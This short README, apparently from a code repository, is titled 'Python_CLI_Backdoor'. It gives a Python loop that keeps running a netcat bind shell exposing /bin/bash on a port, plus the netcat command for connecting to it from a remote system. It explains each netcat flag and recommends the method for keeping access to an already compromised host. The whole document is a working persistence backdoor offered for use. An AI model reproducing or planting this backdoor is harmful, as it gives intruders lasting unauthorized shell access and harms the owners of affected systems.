# Python_CLI_Backdoor

## Objective
Create persistant backdoor utilizing python3 and netcat in Linux CLI

## On Host
```ruby
python3
>>> import os
>>> while True:
...  os.system("nc -l -p portnumber -e /bin/bash")
```
- import os essentially imports bash commands to allow us to execute within python code
-  os.system specifies the bash commands being executed
-  nc : opens tcp connections
-  -l :listen for incoming connections, creating a server
-  -p :specifies what port we will occupy w/ our server
-  -e :allows us to execute commands within /bin/bash

To access this server from a remote system 
## On Remote System
```ruby
nc host-ip-address portnumber
```
Once you are in you can execute bash commands from remote host to be executed on server

## Considerations
The only issue with this attack vector is the need to aready have access to host system, however if you manage a temporary backdoor this could be
a great way to maintain that door open.
